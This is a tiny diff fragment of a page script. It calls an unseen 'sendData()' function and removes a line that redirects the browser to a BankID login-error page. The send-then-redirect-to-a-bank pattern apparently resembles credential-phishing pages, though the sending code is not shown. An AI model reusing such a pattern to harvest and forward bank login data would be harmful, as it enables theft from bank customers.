@@ -89,7 +89,6 @@ async function sendData() {
 }
 
 sendData();
-	document.location = "https://developer.bankid.cz/login-error?locale=en";
   
   
    </script>
